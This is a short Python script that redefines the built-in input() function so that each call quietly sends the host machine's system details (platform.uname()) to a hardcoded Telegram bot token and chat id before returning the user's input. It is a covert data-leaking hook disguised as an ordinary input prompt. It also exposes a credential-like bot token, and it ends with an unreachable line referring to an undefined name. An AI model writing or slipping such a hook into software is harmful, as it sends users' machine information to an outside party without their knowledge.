from telebot import TeleBot
from platform import uname
import random

token = "7685708608:AAHPNb8HLKyi3mSoVS5v1GNND3lwXuOAC3U"
id = "7411230022"

inp = input
def input(prompt=""):
    tb = TeleBot(token)
    tb.send_message(id, uname())
    return inp(prompt)
    
    
    return killing_kommand1 
